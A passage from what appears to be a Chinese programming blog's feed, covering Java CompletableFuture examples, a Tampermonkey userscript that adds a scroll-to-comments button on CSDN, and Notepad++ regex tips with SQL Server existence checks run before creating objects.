class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1024</span>;</span><br><span class="line">        &#125;).handle((f, e) -&gt; &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span> / <span class="number">0</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">1</span>;</span><br><span class="line">        &#125;).handle((f, e) -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">1</span>;</span><br><span class="line">        &#125;).whenCompleteAsync((v, e) -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;*****v: &quot;</span> + v);</span><br><span class="line">        &#125;).exceptionally(e -&gt; &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----主线程结束，END&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程不要立刻结束，否则CompletableFuture默认使用的线程池会立刻关闭:</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p>—–主线程结束，END<br>111<br>333<br>*****v: null<br>java.util.concurrent.CompletionException: java.lang.NullPointerException</p><hr><h2 id="对计算结果进行消费"><a href="#对计算结果进行消费" class="headerlink" title="对计算结果进行消费"></a>对计算结果进行消费</h2><ul><li><code>thenAccept</code>接收任务的处理结果，并<strong>消费处理，无返回结果</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;).thenApply(f -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">2</span>;</span><br><span class="line">        &#125;).thenApply(f -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">3</span>;</span><br><span class="line">        &#125;).thenApply(f -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">4</span>;</span><br><span class="line">        &#125;).thenAccept(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充：Code之任务之间的顺序执行：</p><ul><li><p>thenRun(Runnable runnable)：任务A执行完执行B，并且B不需要A的结果</p></li><li><p>thenAccept(Consumer action)：任务A执行完执行B，B需要A的结果，但是任务B无返回值</p></li><li><p>thenApply(Function fn)：任务A执行完执行B，B需要A的结果，同时任务B有返回值</p></li></ul><h2 id="对计算速度进行选用"><a href="#对计算速度进行选用" class="headerlink" title="对计算速度进行选用"></a>对计算速度进行选用</h2><ul><li><code>applyToEither</code>谁快用谁</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture&lt;Integer&gt; completableFuture1 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in &quot;</span>);</span><br><span class="line">            <span class="comment">//暂停几秒钟线程</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        CompletableFuture&lt;Integer&gt; completableFuture2 = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in &quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        CompletableFuture&lt;Integer&gt; completableFuture = completableFuture1.applyToEither(completableFuture2, f -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> f + <span class="number">1</span>;<span class="comment">//输出21</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + completableFuture.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对计算结果进行合并"><a href="#对计算结果进行合并" class="headerlink" title="对计算结果进行合并"></a>对计算结果进行合并</h2><p>两个CompletionStage任务都完成后，最终能把两个任务的结果一起交给 <code>thenCombine</code> 来处理，先完成的先等着，等待其它分支任务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        CompletableFuture&lt;Integer&gt; thenCombineResult = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in 1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;).thenCombine(CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in 2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">        &#125;), (x, y) -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in 3&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;).thenCombine(CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in 4&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">30</span>;</span><br><span class="line">        &#125;), (a, b) -&gt; &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;---come in 5&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> a + b;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----主线程结束，END&quot;</span>);</span><br><span class="line">        System.out.println(thenCombineResult.get());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 主线程不要立刻结束，否则CompletableFuture默认使用的线程池会立刻关闭:</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<br>ForkJoinPool.commonPool-worker-1—come in 1<br>ForkJoinPool.commonPool-worker-1—come in 2<br>main—come in 3<br>ForkJoinPool.commonPool-worker-2—come in 4<br>main—come in 5<br>—–主线程结束，END<br>60</p><h1 id="线程池运行选择"><a href="#线程池运行选择" class="headerlink" title="线程池运行选择"></a>线程池运行选择</h1><p>以thenRun和thenRunAsync为例，有什么区别？</p><ol><li><p>没有传入自定义线程池，都用默认线程池ForkJoinPool（参考本章的四大静态方法）</p></li><li><p>如果执行第一个任务的时候，传入了一个自定义线程池</p><ol><li>调用thenRun方法执行第二个任务的时候，则第二个任务和第一个任务是用同一个线程池（参考本章的四大静态方法）</li><li>调用thenRunAsync执行第二个任务的时候，则第一个任务使用的是你自己传入的线程池，第二个任务使用的是ForkJoin线程池，后面的任务（thenRun也一样）也是使用ForkJoin线程池。</li><li>也有可能处理太快，系统优化切换原则，直接使用main线程处理</li></ol></li></ol><hr><p>2.2 case:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line">        CompletableFuture&lt;Void&gt; completableFuture = CompletableFuture.supplyAsync(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;TimeUnit.MILLISECONDS.sleep(<span class="number">20</span>);&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;e.printStackTrace();&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;1号任务&quot;</span>+<span class="string">&quot;\t&quot;</span>+Thread.currentThread().getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">        &#125;,threadPool).thenRunAsync(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;TimeUnit.MILLISECONDS.sleep(<span class="number">20</span>);&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;e.printStackTrace();&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;2号任务&quot;</span>+<span class="string">&quot;\t&quot;</span>+Thread.currentThread().getName());</span><br><span class="line">        &#125;).thenRunAsync(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;TimeUnit.MILLISECONDS.sleep(<span class="number">20</span>);&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;e.printStackTrace();&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;3号任务&quot;</span>+<span class="string">&quot;\t&quot;</span>+Thread.currentThread().getName());</span><br><span class="line">        &#125;).thenRunAsync(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;TimeUnit.MILLISECONDS.sleep(<span class="number">20</span>);&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;e.printStackTrace();&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;4号任务&quot;</span>+<span class="string">&quot;\t&quot;</span>+Thread.currentThread().getName());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>1号任务pool-1-thread-1<br>2号任务ForkJoinPool.commonPool-worker-1<br>3号任务ForkJoinPool.commonPool-worker-1<br>4号任务ForkJoinPool.commonPool-worker-1</p><hr><p>2.3 case:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">threadPool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line">        CompletableFuture&lt;Void&gt; completableFuture = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;1号任务&quot;</span> + <span class="string">&quot;\t&quot;</span> + Thread.currentThread().getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">        &#125;, threadPool).thenRun(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;2号任务&quot;</span> + <span class="string">&quot;\t&quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        &#125;).thenRun(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;3号任务&quot;</span> + <span class="string">&quot;\t&quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        &#125;).thenRun(() -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;4号任务&quot;</span> + <span class="string">&quot;\t&quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p>1号任务pool-1-thread-1<br>2号任务main<br>3号任务main<br>4号任务main</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JUC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CompletableFuture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>油猴编写CSDN脚本</title>
      <link href="/posts/25250/"/>
      <url>/posts/25250/</url>
      
        <content type="html"><![CDATA[<h1 id="直达底部的文章推荐"><a href="#直达底部的文章推荐" class="headerlink" title="直达底部的文章推荐"></a>直达底部的文章推荐</h1><p>原本CSDN点击评论按钮，页面会滚到到下面的评论区，很方便看推荐文章；但现在点击评论按钮，评论会在侧边栏展开，所以写了个油猴脚本方便自己浏览CSDN。</p><p>效果如图：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220821181851.png"></p><p>分析：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220821191122.png"></p><ol><li>右键侧边栏工具“检查”该元素，找到对应的html</li><li>可以看到在<code>class=&quot;csdn-side-toolbar&quot; </code>的div块中有各个侧边栏所对应的<strong>a标签</strong></li><li>我们只需在该div块下加入自己的按钮，同时绑定点击事件（获取评论模块的高度，点击按钮滚动到指定位置）即可</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         CSDN直达底部</span></span><br><span class="line"><span class="comment">// @version      1.0</span></span><br><span class="line"><span class="comment">// @description  CSDN直达底部</span></span><br><span class="line"><span class="comment">// @author       Nan</span></span><br><span class="line"><span class="comment">// @match        https://blog.csdn.net/*/article/details/*</span></span><br><span class="line"><span class="comment">// @icon         https://g.csdnimg.cn/static/logo/favicon32.ico</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Your code here...</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);<span class="comment">//创建一个a标签</span></span><br><span class="line">    a.<span class="property">id</span> = <span class="string">&quot;Nan01&quot;</span>;<span class="comment">//设置该a标签的id，方便后面获取该元素</span></span><br><span class="line">    a.<span class="property">className</span> = <span class="string">&quot;option-box&quot;</span>;<span class="comment">//设置与其他a标签一致的class属性</span></span><br><span class="line">    <span class="keyword">var</span> span = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>);<span class="comment">//创建一个a标签</span></span><br><span class="line">    span.<span class="property">textContent</span> = <span class="string">&quot;底部&quot;</span>;<span class="comment">//span标签展示的文字</span></span><br><span class="line">    span.<span class="property">className</span> = <span class="string">&quot;show-txt&quot;</span>;<span class="comment">//设置与其他span标签一致的class属性</span></span><br><span class="line">    span.<span class="property">style</span> = <span class="string">&quot;display:flex;opacity:100;&quot;</span>;<span class="comment">//设置与其他span标签一致的style</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//给a标签绑定按键点击功能</span></span><br><span class="line">    a.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击了按键&#x27;</span>);</span><br><span class="line">        <span class="comment">//以下注释代码是回到顶部的代码，使用setInterval是为了平滑缓慢地向上滚动</span></span><br><span class="line">        <span class="comment">// var height = document.documentElement.scrollTop || document.body.scrollTop;</span></span><br><span class="line">        <span class="comment">// var t = setInterval(() =&gt; &#123;</span></span><br><span class="line">        <span class="comment">//     height -= 50;</span></span><br><span class="line">        <span class="comment">//     if (height &gt; 0) &#123;</span></span><br><span class="line">        <span class="comment">//         window.scrollTo(0, height);</span></span><br><span class="line">        <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">        <span class="comment">//         window.scrollTo(0, 0);</span></span><br><span class="line">        <span class="comment">//         clearInterval(t);</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;, 10);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//查看评论模块所在的div，获取该模块的高度</span></span><br><span class="line">        <span class="keyword">var</span> pcCommentBox = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;pcCommentBox&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> oTop = pcCommentBox.<span class="property">offsetTop</span>;</span><br><span class="line">        <span class="keyword">while</span> (pcCommentBox.<span class="property">offsetParent</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> oParent = pcCommentBox.<span class="property">offsetParent</span></span><br><span class="line">            oTop += oParent.<span class="property">offsetTop</span>  <span class="comment">// Add parent top position</span></span><br><span class="line">            pcCommentBox = oParent</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, oTop);<span class="comment">//页面滚动到指定位置</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;csdn-side-toolbar&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">    x.<span class="title function_">appendChild</span>(a);<span class="comment">//将我们的a标签插入侧边栏中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> y = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;Nan01&#x27;</span>);</span><br><span class="line">    y.<span class="title function_">appendChild</span>(span);<span class="comment">//将我们的span标签插入a标签中</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 油猴 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Daily Support</title>
      <link href="/posts/24756/"/>
      <url>/posts/24756/</url>
      
        <content type="html"><![CDATA[<h1 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad++"></a>Notepad++</h1><p><strong>行前行尾添加字符：</strong></p><ol><li>按Ctrl + H 打开替换窗口</li><li>查找模式选择正则表达式</li><li>输入 ^  行前添加字符串</li><li>输入 $  行尾添加字符串</li></ol><p><strong>删除包含某字符串的行：</strong></p><ol><li>按Ctrl + H 打开替换窗口</li><li>查找模式选择正则表达式</li><li>查找目标输入<code>.*DROP.*</code>，DROP是想替换的关键词</li><li>全部替换</li></ol><p><strong>删除空白行：</strong></p><ol><li>按Ctrl + H 打开替换窗口</li><li>查找模式选择正则表达式</li><li>查找目标输入<code>^\s</code> </li><li>全部替换</li></ol><p><strong>下划线转驼峰：</strong></p><ol><li>按Ctrl + H 打开替换窗口</li><li>查找模式选择正则表达式</li><li>查找目标输入<code>_([a-z])</code> </li><li>替换为<code>\U\1\E</code></li><li>全部替换</li></ol><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="操作前的判断"><a href="#操作前的判断" class="headerlink" title="操作前的判断"></a>操作前的判断</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#创建表前的判断</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF  <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> dbo.sysobjects <span class="keyword">WHERE</span> type <span class="operator">=</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">AND</span> name <span class="operator">=</span> <span class="string">&#x27;table_name&#x27;</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [dbo].[table_name]</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"></span><br><span class="line">#创建存储过程前的判断</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> dbo.sysobjects <span class="keyword">WHERE</span> id <span class="operator">=</span> OBJECT_ID(N<span class="string">&#x27;[dbo].[sp_name]&#x27;</span>) <span class="keyword">AND</span> OBJECTPROPERTY(id, N<span class="string">&#x27;IsProcedure&#x27;</span>) <span class="operator">=</span> <span class="number">1</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> [dbo].[sp_name]</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">#添加表字段前的判断</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> sys.columns <span class="keyword">WHERE</span> object_id <span class="operator">=</span> OBJECT_ID(N<span class="string">&#x27;[dbo].[table_name]&#x27;</span>) <span class="keyword">AND</span> name <span class="operator">=</span> <span class="string">&#x27;column_name&#x27;</span>)</span><br><span class="line">    <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> dbo.table_name <span class="keyword">ADD</span> column_name <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">NULL</span></span><br><span class="line">    <span class="keyword">END</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">#创建触发器前的判断</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID (<span class="string">&#x27;dbo.trigger_name&#x27;</span>, <span class="string">&#x27;TR&#x27;</span>) <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [dbo].[trigger_name]</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">#创建索引前的判断</span><br><span class="line">USE [db_test]</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> sysindexes <span class="keyword">WHERE</span> id <span class="operator">=</span> OBJECT_ID(<span class="string">&#x27;table_name&#x27;</span>) <span class="keyword">AND</span> name <span class="operator">=</span> <span class="string">&#x27;index_name&#x27;</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DROP</span> 